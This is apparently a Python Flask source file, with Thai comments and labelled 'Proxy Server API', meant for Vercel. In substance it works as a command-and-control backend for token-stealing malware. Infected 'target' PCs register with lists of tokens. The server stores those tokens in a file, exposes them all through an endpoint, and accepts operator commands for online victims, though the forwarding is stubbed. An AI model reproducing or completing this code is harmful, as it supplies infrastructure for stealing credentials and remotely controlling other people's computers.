"""Vercel API - Flask app สำหรับ Vercel"""
import json
import os
from datetime import datetime
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET'])
def index():
    """Root endpoint"""
    return jsonify({"message": "Proxy Server API", "status": "running"})

# ฐานข้อมูล (ใช้เก็บ state ชั่วคราว)
storage = {
    "targets": {},
    "admin_socket": None
}

DB_FILE = "/tmp/persistent_db.json"

def save_db():
    """บันทึกข้อมูลลงไฟล์"""
    data = {}
    for name, info in storage["targets"].items():
        data[name] = {
            "tokens": info.get("tokens", []),
            "last_seen": info.get("last_seen", "N/A"),
            "status": info.get("status", "Offline")
        }
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except:
        pass

def load_db():
    """โหลดข้อมูลจากไฟล์"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for name, info in data.items():
                    storage["targets"][name] = {
                        "tokens": info.get("tokens", []),
                        "last_seen": info.get("last_seen", "N/A"),
                        "status": "Offline"
                    }
        except:
            pass

@app.route('/api/health', methods=['GET'])
def health():
    """สำหรับ Vercel health check"""
    return jsonify({"status": "ok"})

@app.route('/api/targets', methods=['GET'])
def get_targets():
    """ส่งข้อมูลเครื่องทั้งหมด"""
    return jsonify(storage["targets"])

@app.route('/api/command', methods=['POST'])
def send_command():
    """รับคำสั่งจากหน้าเว็บ"""
    try:
        data = request.json
        pc_name = data.get("pc_name")
        cmd = data.get("command")
        
        if not pc_name or not cmd:
            return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
        if pc_name in storage["targets"] and storage["targets"][pc_name].get("status") == "Online":
            # ส่งต่อคำสั่งให้ Socket Server
            return jsonify({"status": "success", "message": f"Command queued for {pc_name}"})
        
        return jsonify({"status": "error", "message": "PC is Offline"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/register', methods=['POST'])
def register_target():
    """ลงทะเบียนเครื่องใหม่"""
    try:
        data = request.json
        pc_name = data.get("pc_name")
        tokens = data.get("tokens", [])
        
        if not pc_name:
            return jsonify({"status": "error", "message": "Missing pc_name"}), 400
        
        storage["targets"][pc_name] = {
            "tokens": tokens,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "Online"
        }
        save_db()
        
        return jsonify({"status": "success", "message": f"{pc_name} registered"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

load_db()

if __name__ == "__main__":
    app.run(debug=False)
